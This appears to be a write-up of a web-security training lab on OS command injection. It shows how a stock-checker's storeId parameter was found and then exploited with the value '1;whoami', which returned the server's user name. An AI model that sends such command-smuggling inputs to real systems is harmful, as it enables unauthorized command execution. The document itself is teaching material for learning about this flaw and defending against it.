# OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

---

## 1. Detection

- Clicked on `ACCESS THE LAB` and found multiple products listed on the home page.
- Clicked on one of the products and found an option to check the stock units for that product, with a store selector.
- Selected `Paris` and clicked `Check Stock`.
- The URL stayed at `product?productId=2`, but since the lab description hinted the vulnerable parameter was the store ID (not visible in the URL), opened DevTools to inspect how the request was actually being sent.
- Clicked `Check Stock` again and observed the following `fetch` request in the console:

```javascript
fetch("https://0a74008c03c9d86480185de7002600c0.web-security-academy.net/product/stock", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://0a74008c03c9d86480185de7002600c0.web-security-academy.net/product?productId=2",
  "body": "productId=2&storeId=1",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

- Found the `storeId` parameter in the request body — this was the candidate injection point.

---

## 2. Solve the Challenge

- Modified the `storeId` value to append a shell command using `;` as a command separator, and re-ran the `fetch` call directly in the browser console:

```javascript
fetch("https://0a74008c03c9d86480185de7002600c0.web-security-academy.net/product/stock", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://0a74008c03c9d86480185de7002600c0.web-security-academy.net/product?productId=2",
  "body": "productId=2&storeId=1;whoami",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

- The response came back as:

```
32
peter-PKAdOf
```

> **Why this works:** The backend builds a shell command using the raw `storeId` value without sanitization. The `;` character terminates the original command and allows a second, arbitrary command (`whoami`) to be chained and executed by the shell. The output of `whoami` (the current user) gets appended to the original command's output and returned in the response.

- The current user was `peter-PKAdOf`. Lab solved.